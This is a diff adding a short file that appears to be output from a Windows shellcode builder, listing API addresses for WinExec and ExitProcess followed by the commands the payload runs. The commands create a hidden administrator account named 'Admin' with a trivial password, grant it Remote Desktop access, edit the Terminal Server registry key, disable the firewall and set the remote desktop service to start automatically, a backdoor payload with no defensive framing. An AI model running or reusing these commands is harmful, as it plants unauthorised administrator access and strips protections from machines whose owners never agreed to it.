@@ -1,0 +1,16 @@
+
+WinExec =>  0x769e2c91
+ExitProcess =>  0x769679f8
+====================================
+Execute :
+net user Admin Admin /add
+net localgroup Administrators Admin /add
+NET LOCALGROUP "Remote Desktop Users" Admin /add  
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f 
+netsh firewall set opmode disable
+sc config termservice start= auto
+Exit
+
+
+
+
